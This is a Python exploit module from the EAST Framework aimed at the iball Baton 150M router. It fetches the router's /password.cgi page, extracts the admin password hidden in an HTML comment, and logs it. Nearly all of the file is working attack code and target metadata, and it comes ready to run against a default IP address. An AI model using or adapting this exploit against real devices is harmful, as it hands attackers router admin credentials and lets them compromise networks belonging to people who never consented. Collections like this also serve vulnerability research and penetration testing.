#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib2
from time import sleep

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_iball_batton_150m_cd"
INFO['DESCRIPTION'] = "iball Baton 150M Password Disclosure"
INFO['VENDOR'] = "http://www.iball.co.in"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://packetstormsecurity.com/files/141522/iball-Baton-150M-Password-Disclosure.html']
INFO["CVE Name"] = ""
INFO["NOTES"] = """iball Baton 150M Router's login page is insecurely developed that any attacker could bypass the admin's authentication just by tweaking the password.cgi file.
Firmware Version : 1.2.6 build 110401 Rel.47776n
Hardware Version : iB-WRA150N v1 00000001
"""

INFO['CHANGELOG'] = "10 Mar, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "172.20.174.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        
        url = self.make_url('/password.cgi')
        try:
            fd = urllib2.urlopen(url)
            source = fd.read()
            result = source.split('<!-- hide')[1].split('function')[0]
            self.log(result)
        except Exception as e:
            self.log(False)
            self.finish(False)
        
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()

